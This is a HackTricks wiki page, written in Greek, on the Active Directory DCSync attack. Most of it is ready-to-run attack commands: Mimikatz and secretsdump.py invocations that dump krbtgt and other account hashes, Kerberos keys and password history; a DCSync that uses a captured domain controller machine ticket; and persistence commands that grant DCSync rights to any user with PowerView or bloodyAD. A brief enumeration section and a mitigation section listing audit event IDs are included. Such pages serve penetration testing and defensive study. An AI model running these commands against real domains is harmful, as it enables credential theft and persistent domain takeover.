# DCSync

{{#include ../../banners/hacktricks-training.md}}

## DCSync

Το δικαίωμα **DCSync** συνεπάγεται την ύπαρξη των εξής δικαιωμάτων στο ίδιο το domain: **DS-Replication-Get-Changes**, **Replicating Directory Changes All** και **Replicating Directory Changes In Filtered Set**.<sup>[[3]](#references)</sup>

**Σημαντικές σημειώσεις για το DCSync:**

- Η **επίθεση DCSync προσομοιώνει τη συμπεριφορά ενός Domain Controller και ζητά από άλλους Domain Controllers να αναπαράγουν πληροφορίες** χρησιμοποιώντας το Directory Replication Service Remote Protocol (MS-DRSR). Επειδή το MS-DRSR είναι μια έγκυρη και απαραίτητη λειτουργία του Active Directory, δεν μπορεί να απενεργοποιηθεί.
- Από προεπιλογή, μόνο οι ομάδες **Domain Admins, Enterprise Admins, Administrators και Domain Controllers** διαθέτουν τα απαιτούμενα δικαιώματα.
- Στην πράξη, το **πλήρες DCSync** απαιτεί τα δικαιώματα **`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`** στο domain naming context. Το `DS-Replication-Get-Changes-In-Filtered-Set` συνήθως εκχωρείται μαζί με αυτά, αλλά από μόνο του αφορά περισσότερο τον συγχρονισμό **εμπιστευτικών χαρακτηριστικών / χαρακτηριστικών που φιλτράρονται από RODC** (για παράδειγμα, μυστικών τύπου legacy LAPS) παρά την πλήρη εξαγωγή του krbtgt.<sup>[[2]](#references)</sup>
- Αν οι κωδικοί πρόσβασης οποιουδήποτε λογαριασμού αποθηκεύονται με αντιστρέψιμη κρυπτογράφηση, το Mimikatz διαθέτει επιλογή για την εμφάνιση του κωδικού πρόσβασης σε απλό κείμενο.

### Απαρίθμηση

Ελέγξτε ποιος έχει αυτά τα δικαιώματα χρησιμοποιώντας το `powerview`:

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{($_.ObjectType -match 'replication-get') -or ($_.ActiveDirectoryRights -match 'GenericAll') -or ($_.ActiveDirectoryRights -match 'WriteDacl')}
```

Αν θέλετε να εστιάσετε σε **μη προεπιλεγμένους principals** με δικαιώματα DCSync, φιλτράρετε τις ενσωματωμένες ομάδες που έχουν δυνατότητα replication και εξετάστε μόνο μη αναμενόμενους trustees:

```powershell
$domainDN = "DC=dollarcorp,DC=moneycorp,DC=local"
$default = "Domain Controllers|Enterprise Domain Controllers|Domain Admins|Enterprise Admins|Administrators"
Get-ObjectAcl -DistinguishedName $domainDN -ResolveGUIDs |
  Where-Object {
    $_.ObjectType -match 'replication-get' -or
    $_.ActiveDirectoryRights -match 'GenericAll|WriteDacl'
  } |
  Where-Object { $_.IdentityReference -notmatch $default } |
  Select-Object IdentityReference,ObjectType,ActiveDirectoryRights
```

### Exploit τοπικά

```bash
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### Exploit εξ αποστάσεως

```bash
secretsdump.py -just-dc <user>:<password>@<ipaddress> -outputfile dcsync_hashes
[-just-dc-user <USERNAME>] #To get only of that user
[-ldapfilter '(adminCount=1)'] #Or scope the dump to objects matching an LDAP filter
[-just-dc-ntlm] #Only NTLM material, faster/cleaner when you don't need Kerberos keys
[-pwd-last-set] #To see when each account's password was last changed
[-user-status] #Show if the account is enabled/disabled while dumping
[-history] #To dump password history, may be helpful for offline password cracking
```

Πρακτικά παραδείγματα περιορισμένου πεδίου:<sup>[[1]](#references)</sup>

```bash
# Only the krbtgt account
secretsdump.py -just-dc-user krbtgt <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Only privileged objects selected through LDAP
secretsdump.py -just-dc-ntlm -ldapfilter '(adminCount=1)' <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>

# Add metadata and password history for cracking/reuse analysis
secretsdump.py -just-dc-ntlm -history -pwd-last-set -user-status <DOMAIN>/<USER>:<PASSWORD>@<DC_IP>
```

### DCSync με χρήση καταγεγραμμένου TGT υπολογιστή DC (ccache)

Κατά την εξέταση μιας υπηρεσίας σε έναν domain controller, διακρίνετε την τοπική ταυτότητα της υπηρεσίας από την ταυτότητά της στο δίκτυο. [Η Microsoft τεκμηριώνει](https://learn.microsoft.com/en-us/sql/database-engine/configure-windows/configure-windows-service-accounts-and-permissions) ότι οι virtual accounts του SQL Server (`NT SERVICE\...`) αποκτούν πρόσβαση σε πόρους δικτύου ως ο λογαριασμός υπολογιστή του host. Σε έναν domain controller, αυτό μπορεί να καταστήσει τον λογαριασμό υπολογιστή του DC σχετικό με τον έλεγχο των δικαιωμάτων replication, αλλά η πρόσβαση σε μια υπηρεσία από μόνη της δεν αποδεικνύει ότι υπάρχει δυνατότητα εξαγωγής machine TGT ή ότι είναι δυνατή η χρήση του για authentication μέσω DCSync. Επαληθεύστε την πραγματική ταυτότητα της υπηρεσίας, το πλαίσιο εξερχόμενου authentication, το διαθέσιμο ticket ή τα διαπιστευτήρια, καθώς και τα ισχύοντα δικαιώματα replication, πριν θεωρήσετε ότι αυτό αποτελεί διαδρομή.

Σε σενάρια unconstrained-delegation με λειτουργία export, μπορείτε να καταγράψετε ένα machine TGT του Domain Controller (π.χ., `DC1$@DOMAIN` για `krbtgt@DOMAIN`). Στη συνέχεια, μπορείτε να χρησιμοποιήσετε αυτό το ccache για να κάνετε authentication ως ο DC και να εκτελέσετε DCSync χωρίς κωδικό πρόσβασης.<sup>[[5]](#references)</sup>

```bash
# Generate a krb5.conf for the realm (helper)
netexec smb <DC_FQDN> --generate-krb5-file krb5.conf
sudo tee /etc/krb5.conf < krb5.conf

# netexec helper using KRB5CCNAME
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  netexec smb <DC_FQDN> --use-kcache --ntds

# Or Impacket with Kerberos from ccache
KRB5CCNAME=DC1$@DOMAIN.TLD_krbtgt@DOMAIN.TLD.ccache \
  secretsdump.py -just-dc -k -no-pass <DOMAIN>/ -dc-ip <DC_IP>
```

Σημειώσεις λειτουργίας:

- **Η διαδρομή Kerberos του Impacket έρχεται πρώτα σε επαφή με το SMB** πριν από την κλήση DRSUAPI. Αν το περιβάλλον επιβάλλει **επικύρωση ονόματος στόχου SPN**, ένα πλήρες dump μπορεί να αποτύχει με το μήνυμα `Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user`.
- Σε αυτή την περίπτωση, είτε ζητήστε πρώτα ένα ticket υπηρεσίας **`cifs/<dc>`** για τον DC-στόχο είτε χρησιμοποιήστε το **`-just-dc-user`** για τον λογαριασμό που χρειάζεστε άμεσα.
- Όταν διαθέτετε μόνο χαμηλότερα δικαιώματα αναπαραγωγής, ο συγχρονισμός τύπου LDAP/DirSync μπορεί και πάλι να εκθέσει **εμπιστευτικά** ή **φιλτραρισμένα από RODC** attributes (για παράδειγμα, το παλιό `ms-Mcs-AdmPwd`) χωρίς πλήρη αναπαραγωγή του krbtgt.<sup>[[2]](#references)</sup>

Το `-just-dc` δημιουργεί 3 αρχεία:

- ένα με τα **NTLM hashes**
- ένα με τα **Kerberos keys**
- ένα με κωδικούς πρόσβασης σε cleartext από το NTDS για τυχόν λογαριασμούς στους οποίους είναι ενεργοποιημένη η [**αναστρέψιμη κρυπτογράφηση**](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/store-passwords-using-reversible-encryption). Μπορείτε να βρείτε χρήστες με αναστρέψιμη κρυπτογράφηση με

  ```bash
  Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
  ```

### Persistence

Αν είστε διαχειριστής τομέα, μπορείτε να εκχωρήσετε αυτά τα δικαιώματα σε οποιονδήποτε χρήστη με τη βοήθεια του PowerView:<sup>[[3]](#references)</sup>

```bash
Add-ObjectAcl -TargetDistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -PrincipalSamAccountName username -Rights DCSync -Verbose
```

Οι Linux operators μπορούν να κάνουν το ίδιο με το `bloodyAD`:

```bash
bloodyAD --host <DC_IP> -d <DOMAIN> -u <USER> -p '<PASSWORD>' add dcsync <TRUSTEE>
```

Στη συνέχεια, μπορείς να **ελέγξεις αν στον χρήστη εκχωρήθηκαν σωστά** τα 3 προνόμια, αναζητώντας τα στην έξοδο της εντολής (θα πρέπει να βλέπεις τα ονόματα των προνομίων μέσα στο πεδίο "ObjectType"):

```bash
Get-ObjectAcl -DistinguishedName "dc=dollarcorp,dc=moneycorp,dc=local" -ResolveGUIDs | ?{$_.IdentityReference -match "student114"}
```

### Μετριασμός

- Security Event ID 4662 (Πρέπει να είναι ενεργοποιημένη η πολιτική ελέγχου για το αντικείμενο) – Εκτελέστηκε μια λειτουργία σε ένα αντικείμενο<sup>[[4]](#references)</sup>
- Security Event ID 5136 (Πρέπει να είναι ενεργοποιημένη η πολιτική ελέγχου για το αντικείμενο) – Τροποποιήθηκε ένα αντικείμενο υπηρεσίας καταλόγου
- Security Event ID 4670 (Πρέπει να είναι ενεργοποιημένη η πολιτική ελέγχου για το αντικείμενο) – Άλλαξαν τα δικαιώματα σε ένα αντικείμενο
- AD ACL Scanner - Δημιουργήστε και συγκρίνετε αναφορές ACL. [https://github.com/canix1/ADACLScanner](https://github.com/canix1/ADACLScanner)

## References

- [1] [Αρχείο αλλαγών του Impacket](https://github.com/fortra/impacket/blob/master/ChangeLog.md)
- [2] [DirSync: Αξιοποίηση των Replication Get-Changes και Get-Changes-In-Filtered-Set](https://simondotsh.com/infosec/2022/07/11/dirsync.html)
- [3] [DCSync: Εξαγωγή κατακερματισμών κωδικών πρόσβασης από Domain Controller](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/dump-password-hashes-from-domain-controller-with-dcsync)
- [4] [DCSync](https://yojimbosecurity.ninja/dcsync/)
- [5] [HTB: Delegate — Διαπιστευτήρια SYSVOL → Targeted Kerberoast → Unconstrained Delegation → DCSync για DA](https://0xdf.gitlab.io/2025/09/12/htb-delegate.html)
{{#include ../../banners/hacktricks-training.md}}
